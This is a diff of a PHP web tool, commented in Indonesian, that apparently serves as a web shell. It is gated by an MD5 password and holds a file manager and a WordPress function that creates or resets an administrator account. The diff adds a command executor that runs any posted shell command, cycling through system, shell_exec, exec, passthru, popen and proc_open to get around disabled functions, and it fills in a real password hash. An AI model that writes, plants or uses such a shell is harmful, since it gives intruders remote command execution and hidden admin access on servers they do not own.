@@ -7,7 +7,7 @@ session_start();
 
 // Ganti dengan MD5 hash dari password kamu
 // Generate: php -r "echo md5('password_kamu');"
-$PASSWORD_MD5 = 'a1b2c3d4e5f6...'; // <-- GANTI INI
+$PASSWORD_MD5 = 'a871191c9dfc665690da9838131ed8ea'; // <-- GANTI INI
 
 /* =======================
    AUTHENTICATION
@@ -250,10 +250,6 @@ function delete_path($path){
    WORDPRESS ADMIN CREATOR
    ======================= */
 
-/**
- * Cari wp-load.php otomatis dari beberapa kemungkinan path.
- * Return path kalau ketemu, false kalau tidak.
- */
 function find_wp_load($base_dir){
 	$candidates = [
 		$base_dir . '/wp-load.php',
@@ -274,22 +270,15 @@ function find_wp_load($base_dir){
 	return false;
 }
 
-/**
- * Buat / reset user WordPress admin.
- * Return array ['ok' => bool, 'msg' => string]
- */
 function create_wp_admin($wp_load_path, $username, $password, $email, $role = 'administrator'){
-	// Load WordPress
 	require_once($wp_load_path);
 
-	// Cek fungsi WP sudah ada
 	if (!function_exists('wp_create_user') || !function_exists('username_exists')) {
 		return ['ok' => false, 'msg' => 'WordPress API tidak tersedia setelah load wp-load.php'];
 	}
 
 	$out = '';
 
-	// Validasi
 	$username = trim($username);
 	$password = (string)$password;
 	$email    = trim($email);
@@ -301,18 +290,15 @@ function create_wp_admin($wp_load_path, $username, $password, $email, $role = 'a
 	$existing = get_user_by('login', $username);
 
 	if ($existing) {
-		// User sudah ada → reset password
 		wp_set_password($password, $existing->ID);
 		$user_id = $existing->ID;
 
-		// Update email kalau diisi
 		if ($email !== '' && $email !== $existing->user_email) {
 			wp_update_user(['ID' => $user_id, 'user_email' => $email]);
 		}
 
 		$out .= "User <b>" . _html($username) . "</b> sudah ada → password direset.<br>";
 	} else {
-		// Buat user baru
 		$user_id = wp_create_user($username, $password, $email);
 
 		if (is_wp_error($user_id)) {
@@ -322,7 +308,6 @@ function create_wp_admin($wp_load_path, $username, $password, $email, $role = 'a
 		$out .= "User <b>" . _html($username) . "</b> berhasil dibuat (ID: $user_id).<br>";
 	}
 
-	// Set role
 	$user = new WP_User($user_id);
 	$user->set_role($role);
 	$out .= "Role: <b>" . _html($role) . "</b><br>";
@@ -333,6 +318,99 @@ function create_wp_admin($wp_load_path, $username, $password, $email, $role = 'a
 }
 
 /* =======================
+   COMMAND EXECUTOR
+   ======================= */
+
+/**
+ * Jalankan command shell pakai fungsi yang tersedia.
+ * Return ['ok'=>bool, 'out'=>string, 'method'=>string, 'code'=>int]
+ */
+function run_cmd($cmd, $cwd){
+	$disabled = array_map('trim', explode(',', strtolower((string)ini_get('disable_functions'))));
+
+	$methods = ['system', 'shell_exec', 'exec', 'passthru', 'popen', 'proc_open'];
+	$available = [];
+
+	foreach ($methods as $m) {
+		if (function_exists($m) && !in_array($m, $disabled, true)) {
+			$available[] = $m;
+		}
+	}
+
+	if (empty($available)) {
+		return ['ok' => false, 'out' => 'Semua fungsi eksekusi command di-disable di php.ini (disable_functions).', 'method' => '-', 'code' => -1];
+	}
+
+	// Coba satu per satu
+	foreach ($available as $m) {
+		$out = '';
+		$code = -1;
+
+		switch ($m) {
+			case 'system':
+				ob_start();
+				$code = system($cmd);
+				$out = ob_get_clean();
+				break;
+
+			case 'shell_exec':
+				$out = shell_exec($cmd);
+				$code = 0;
+				break;
+
+			case 'exec':
+				$lines = [];
+				$code = 0;
+				exec($cmd, $lines, $code);
+				$out = implode("\n", $lines);
+				break;
+
+			case 'passthru':
+				ob_start();
+				passthru($cmd, $code);
+				$out = ob_get_clean();
+				break;
+
+			case 'popen':
+				$h = @popen($cmd, 'r');
+				if (is_resource($h)) {
+					while (!feof($h)) {
+						$out .= fread($h, 4096);
+					}
+					$code = pclose($h);
+				} else {
+					$code = -1;
+				}
+				break;
+
+			case 'proc_open':
+				$desc = [
+					1 => ['pipe', 'w'],
+					2 => ['pipe', 'w'],
+				];
+				$p = @proc_open($cmd, $desc, $pipes, $cwd);
+				if (is_resource($p)) {
+					$out = stream_get_contents($pipes[1]);
+					$err = stream_get_contents($pipes[2]);
+					fclose($pipes[1]);
+					fclose($pipes[2]);
+					$code = proc_close($p);
+					if ($out === '' && $err !== '') $out = $err;
+				} else {
+					$code = -1;
+				}
+				break;
+		}
+
+		if ($code !== -1 || $out !== '' || $out !== null) {
+			return ['ok' => true, 'out' => (string)$out, 'method' => $m, 'code' => $code];
+		}
+	}
+
+	return ['ok' => false, 'out' => 'Semua metode gagal mengeksekusi command.', 'method' => '-', 'code' => -1];
+}
+
+/* =======================
    LOGIC
    ======================= */
 
@@ -340,8 +418,8 @@ $d = _real(_gp('d', __DIR__));
 if (!$d) die('bad path');
 _cd($d);
 
-// Variabel untuk menampilkan hasil create WP admin
 $wp_result = null;
+$cmd_result = null;
 
 if (_sp('REQUEST_METHOD') == 'POST') {
 
@@ -387,6 +465,16 @@ if (_sp('REQUEST_METHOD') == 'POST') {
 			$wp_result = ['ok' => false, 'msg' => 'wp-load.php tidak ditemukan dari folder aktif. Coba navigasi ke folder instalasi WordPress.'];
 		} else {
 			$wp_result = create_wp_admin($wp_load, $wp_user, $wp_pass, $wp_email, $wp_role);
+		}
+	}
+
+	// Run Command
+	if (_pp('cmd_run')) {
+		$cmd = (string)_pp('cmd', '');
+		if (trim($cmd) === '') {
+			$cmd_result = ['ok' => false, 'out' => 'Command kosong.', 'method' => '-', 'code' => -1];
+		} else {
+			$cmd_result = run_cmd($cmd, $d);
 		}
 	}
 }
@@ -486,6 +574,29 @@ echo "<form method=post>
 Cari wp-load.php otomatis dari folder aktif (naik maks 5 level).<br>
 Kalau user sudah ada → password direset & role diganti.<br>
 Gunakan hanya di environment milikmu sendiri.
+</div>
+</fieldset>";
+
+// ============ COMMAND EXECUTOR ============
+echo "<fieldset style='margin-bottom:12px;padding:10px;border:1px solid #444'>
+<legend><b>Command Executor</b></legend>";
+
+if ($cmd_result !== null) {
+	$color = $cmd_result['ok'] ? '#0f0' : '#f33';
+	echo "<div style='color:$color;margin-bottom:6px'>";
+	echo "Method: <b>" . _html($cmd_result['method']) . "</b> | Exit code: <b>" . _html((string)$cmd_result['code']) . "</b>";
+	echo "</div>";
+	echo "<pre style='background:#000;color:#0f0;padding:10px;max-height:400px;overflow:auto;white-space:pre-wrap;border:1px solid #333'>" . _html($cmd_result['out']) . "</pre>";
+}
+
+echo "<form method=post style='margin-top:6px'>
+<input type=text name=cmd placeholder='contoh: ls -la / atau whoami' style='width:70%' required>
+<input type=hidden name=cmd_run value=1>
+<button style='background:#003366'>Run</button>
+</form>
+<div style='font-size:11px;color:#888;margin-top:5px'>
+Coba fungsi: system → shell_exec → exec → passthru → popen → proc_open.<br>
+CWD: <code>" . _html($d) . "</code>
 </div>
 </fieldset><hr>";
 
